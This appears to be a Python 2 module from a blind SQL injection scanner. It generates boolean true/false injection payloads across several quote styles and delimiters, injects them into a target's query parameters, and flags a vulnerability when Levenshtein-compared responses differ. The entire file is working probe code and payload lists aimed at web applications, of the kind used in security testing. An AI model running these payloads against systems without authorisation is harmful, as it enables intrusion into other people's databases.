# coding=utf-8
import request
import result
import Levenshtein
import copy
import re
import os
import time  


TrueFalsePayload1 = (
    #Single quotes
    "' and 7777;-- ",
    "' and 0=0;-- ",
    "' or 9999;-- ",
    "' and 0;-- ",

    #numeric
    " and 7777;-- ",
    " and 0=0;-- ",
    " or 9999;-- ",
    " and 0;-- ",

    #double quotes
    '" and 7777;-- ',
    '" and 0=0;-- ',
    '" or 9999;-- ',
    '" and 0;-- '
)
TrueFalsePayload2 = (
    #Single quotes
    ("' and 7777='7777",
    "' and 0='0",
    "' or 9999='9999",
    "' and 7777='7788"),

    #numeric
    (" and 7777=7777",
    " and 0=0",
    " or 9999=9999",
    " and 7777=7778"),

    #double quotes
    ('" and 7777="7777',
    '" and 0="0',
    '" or 7777="7777',
    '" and 7777="7778')
)
PayloadTuple = (
    "%s%sand%s%s7777%s=%s7777",
    "%s%sand%s%s0%s=%s0",
    "%s%sor%s%s9999%s=%s9999",
    "%s%sand%s%s7777%s=%s7778",
)
Quote=(
    "'",
    '"',
    ''
)
Delimiter=(
    '+',
    '\t',
    '/**/',
    '\n'   
)

def get_payload_list():
    payloadList = []
    for j in Delimiter:
        for i in Quote:
            tmp = []
            for k in PayloadTuple:
                s = k%(i,j,j,i,i,i)
                tmp.append(s)
            payloadList.append(tmp)
    return payloadList

TrueFalsePayload = get_payload_list()
for i in range(len(TrueFalsePayload)):
    print "\nGroup:%d\n"%(i)
    for j in TrueFalsePayload[i]:
        print j
    print '\n' 
print "PayloadList:",TrueFalsePayload
#TrueFalsePayload = TrueFalsePayload2
class BSqliRspDiff():
    def __init__(self, req, eq_limit=0.98):
        self._req = copy.deepcopy(req)
        self._eq_limit = eq_limit
            
    def relative_compare(self, strA, strB):
        '''
            using Levenshtein algorithm to calculate similarity of strA and strB
        '''
        ratio = Levenshtein.ratio(strA,strB)
        if ratio >= self._eq_limit:
            #print "\nRatio:%f and result = True"%(ratio)
            #print "ratio:",ratio," eq_limit:0.98"," rst:",True
            return True
        else:
            #print "\nRatio:%f and result = False"%(ratio)
            #print "ratio:",ratio," eq_limit:0.98"," rst:",True
            return False
        print "ratio:",ratio," eq_limit:0.98"," rst:",True
            
    def response_diff(self):
        req = self._req
        #true/false response comparison
        for i in range(0,len(TrueFalsePayload)):
            trueStm1 = TrueFalsePayload[i][0]
            trueStm2 = TrueFalsePayload[i][1]
            trueStm3 = TrueFalsePayload[i][2]
            falseStm = TrueFalsePayload[i][3]
            
            trueQueryList1=request.get_payload_query_list(req._query,trueStm1)
            trueQueryList2=request.get_payload_query_list(req._query,trueStm2)
            trueQueryList3=request.get_payload_query_list(req._query,trueStm3)
            falseQueryList=request.get_payload_query_list(req._query,falseStm)

            for j in range(len(trueQueryList1)):

                tmpReq1 = copy.deepcopy(req)
                tmpReq2 = copy.deepcopy(req)
                tmpReq3 = copy.deepcopy(req)
                tmpReq4 = copy.deepcopy(req)

                tmpReq1._query = trueQueryList1[j] 
                tmpReq2._query = trueQueryList2[j] 
                rsp1 = request.sendRequest(tmpReq1)
                rsp2 = request.sendRequest(tmpReq2)
                cleanRsp = self.relative_compare(rsp1.content,rsp2.content)
                
                tmpReq3._query = trueQueryList1[j] 
                tmpReq4._query = falseQueryList[j] 
                rsp3 = request.sendRequest(tmpReq3)
                rsp4 = request.sendRequest(tmpReq4)
                payloadRsp = self.relative_compare(rsp3.content,rsp4.content)  
                # payloadRsp = self.compare_response_diff(tmpReq1,tmpReq2)
                
                if cleanRsp == True and payloadRsp == False:
                    # find vuln and insert record into db
                    # code for insert db    
                    print "\n*******************************"
                    print "**Find bsqli in:"
                    print "!!!!!!!!!!!url:",self._req._url
                    print "*payload:",falseStm
                    print "*cleanRsp:",cleanRsp
                    print "*payloadRsp:",payloadRsp
                    print "*******************************\n"
                    return result.Result([tmpReq1,tmpReq2,tmpReq3,tmpReq4],[rsp1,rsp2,rsp3,rsp4],TrueFalsePayload[i])
                else:
                    tmpReq5 = copy.deepcopy(req)
                    tmpReq6 = copy.deepcopy(req)
                    tmpReq5._query = trueQueryList3[j] 
                    tmpReq6._query = falseQueryList[j] 
                    rsp5 = request.sendRequest(tmpReq5)
                    rsp6 = request.sendRequest(tmpReq6)
                    orRsp = self.relative_compare(rsp5.content,rsp6.content) 
                    if cleanRsp == True and orRsp == False:
                        print "\n*******************************"
                        print "* Find bsqli in:"
                        print "!!!!!!!!!url:",self._req._url
                        print "*payload:",falseStm
                        print "*cleanRsp:",cleanRsp
                        print "*orRsp:",orRsp
                        print "*******************************\n"                                       
                        return result.Result([tmpReq1,tmpReq2,tmpReq5,tmpReq6],[rsp1,rsp2,rsp5,rsp6],TrueFalsePayload[i]) 


def start(req): 
    bsi = BSqliRspDiff(req)
    return bsi.response_diff()
  
